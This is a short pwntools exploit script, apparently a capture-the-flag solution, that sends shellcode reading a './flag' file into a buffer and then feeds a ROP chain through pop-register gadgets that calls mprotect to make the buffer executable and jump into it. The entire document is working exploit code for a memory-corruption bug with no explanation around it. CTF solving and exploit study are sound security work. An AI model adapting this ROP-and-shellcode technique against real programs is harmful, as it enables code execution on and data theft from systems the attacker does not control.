from pwn import *
context(os='linux',arch='amd64',log_level='debug')
#p=remote('localhost',9000)
p=process('./pwn')
mprotect=0x443520
pop_rdi=0x401a40
pop_rsi=0x401a42
pop_rdx=0x401a44
buf=0x4ceb60
bss=buf+0x200
shellcode=shellcraft.openat(-100,'./flag\x00')
shellcode+=shellcraft.read(3,bss,0x50)
shellcode+=shellcraft.write(1,bss,0x50)
payload=asm(shellcode)
p.sendafter(b'fill it.\n',payload)
payload=b'aaaa'+p32(1)
rop=flat([
    pop_rdi,
    0x4ce000,
    pop_rsi,
    0x1000,
    pop_rdx,
    0x7,
    mprotect,
    buf
])
p.sendafter(b'>',payload)
for i in range(8):
    p.sendafter(b'>',rop[i*8:i*8+8])
p.interactive()

